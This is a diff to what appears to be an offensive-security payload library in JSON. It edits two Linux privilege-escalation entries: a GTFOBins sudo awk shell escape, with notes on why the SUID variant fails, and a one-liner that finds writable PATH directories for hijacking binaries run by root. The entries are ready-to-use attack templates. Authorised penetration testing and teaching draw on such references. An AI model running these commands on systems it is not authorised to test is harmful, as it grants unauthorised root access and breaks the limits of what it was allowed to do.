@@ -2567,11 +2567,11 @@
     "id": "pe2-gtfo-awk",
     "group": "Privilege Escalation",
     "category": "PrivEsc (Linux)",
-    "name": "GTFOBins — awk (sudo/SUID)",
+    "name": "GTFOBins — awk (sudo)",
     "type": "linux",
     "encoding": "raw",
     "template": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
-    "notes": "awk system() runs as the privileged user. SUID variant: awk 'BEGIN {system(\"/bin/sh -p\")}'. GTFOBins."
+    "notes": "sudo technique: awk system() runs /bin/sh -c as the elevated user, so it keeps root when launched through sudo (GTFOBins). Not advertised as a SUID method: system() first spawns /bin/sh -c, which commonly drops euid back to the real UID before the inner shell starts."
   },
   {
     "id": "pe2-caps-getcap",
@@ -2600,7 +2600,7 @@
     "name": "Writable dirs in PATH",
     "type": "linux",
     "encoding": "raw",
-    "template": "echo $PATH | tr ':' '\\n' | xargs -I{} sh -c 'test -w {} && echo writable: {}'",
+    "template": "printf '%s\\n' \"$PATH\" | tr ':' '\\n' | while IFS= read -r d; do test -w \"$d\" && printf 'writable: %s\\n' \"$d\"; done",
     "notes": "A writable dir early in PATH lets you hijack a binary a root cron/SUID tool calls by bare name. Also check for '.' in PATH."
   },
   {
